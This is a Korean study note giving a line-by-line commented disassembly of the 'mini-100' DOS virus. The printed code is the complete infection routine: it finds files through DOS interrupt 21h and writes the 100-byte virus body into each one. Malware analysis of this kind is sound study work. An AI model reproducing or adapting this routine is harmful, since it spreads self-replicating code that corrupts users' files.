; mini-100 바이러스 분석
; Analysis by g0pher

; 처음이라 라인바이 라인으로 분석해보았다(analysis1)

PUSH    SI          ; SI를 스택에 저장
PUSH    SI
POP     DI          ; DI에 SI값을 넣음
MOV     AX,CS       ; AX에 CS를 저장
INC     AH          ; AH를 증가
MOV     ES,AX       ; ES에 AX의 데이터를 삽입
MOV     CL,64       ; CL에 64h(바이러스 크기)를 삽입
REPZ                ; CX만큼 다음 명령을 반복
MOVSB               ; DS:SI의 내용을 ES:DI로 옮긴다.
POP     SI          ; 스택에서 하나를 꺼내 SI에 저장
MOV     AH,4E       ; AH에 4E값 넣기
MOV     DX,015E     ; DX에 015E값 넣기
INT     21          ; 인터럽트 21 호출
JNB     012D        ; 캐리 플래그가 0이면 점프(Jump if Not Below)
PUSH    SI          ; SI를 스택에 저장
PUSH    ES          ; ES를 스택에 저장
PUSH    CS
POP     ES          ; ES에 CS값을 넣음
XCHG    DI,SI       ; DI와 SI의 값을 서로 바꾼다
MOV     CX,FE9B     ; CX에 FE9B(전체-바이러스 마지막 위치)를 저장
MOV     AX,0125     ; AX에 0125를 저장
PUSH    AX          ; AX를 스택에 저장
RETF                ; 스택에서 POP 두번해서 1번은 IP에 2번은 CS에 넣는다
REPZ                ; CX만큼 다음 명령을 반복
MOVSB               ; DS:SI의 내용을 ES:DI로 옮긴다.
POP     SI          ; 스택에서 하나를 꺼내 SI에 저장
PUSH    ES          ; ES를 스택에 저장
PUSH    ES
POP     DS          ; DS에 ES값을 저장
PUSH    SI          ; SI의 값을 스택에 저장
RETF                ; 스택에서 POP 두번해서 1번은 IP에 2번은 CS에 넣는다
XCHG    DX,AX       ; DX와 AX의 값을 서로 바꾼다
MOV     AX,3D02     ; AX에 3D02값 저장
MOV     DL,9E       ; DL에 9E값 저장
INT     21          ; 인터럽트 21 호출
XCHG    BX,AX       ; BX와 AX의 값을 서로 바꾼다
PUSH    ES
POP     DS          ; DS에 ES값을 저장
MOV     AH,3F       ; AH에 3F를 저장
PUSH    DI
POP     DX          ; DX에 DI값을 저장
XOR     CX,CX       ; CX와 CX를 XOR하여 CX에 저장
PUSH    CX          ; CX를 스택에 저장
DEC     CX          ; CX를 하나 줄인다
INT     21          ; 인터럽트 21 호출
ADD     AX,0064     ; AX에 64h(바이러스 크기)를 더한다
POP     CX          ; 스택에서 하나를 꺼내 CX에 저장한다
PUSH    AX          ; AX를 스택에 저장
MOV     AX,4200     ; AX에 4200을 저장
CWD                 ; AX를 DX:AX로 확장.(DX 초기화)
INT     21          ; 인터럽트 21을 호출
MOV     AH,40       ; AH에 40을 저장
POP     CX          ; 스택에서 하나를 꺼내 CX에 저장
PUSH    SI
POP     DX          ; DX에 SI값을 저장
INT     21          ; 인터럽트 21 호출
PUSH    CS
POP     DS          ; DS에 CS값을 저장
MOV     AH,3E       ; AHDP 3E를 저장
INT     21          ; 인터럽트 21 호출
MOV     AH,4F       ; AH에 4F 저장
JMP     0113        ; 0113으로 점프

SUB     CH,[6F63]   ; 어셈블리코드가 아니라 데이터 부분.
DB      6D          ; 어셈블리코드가 아니라 데이터 부분.
ADD     BL,AL       ; 어셈블리코드가 아니라 데이터 부분.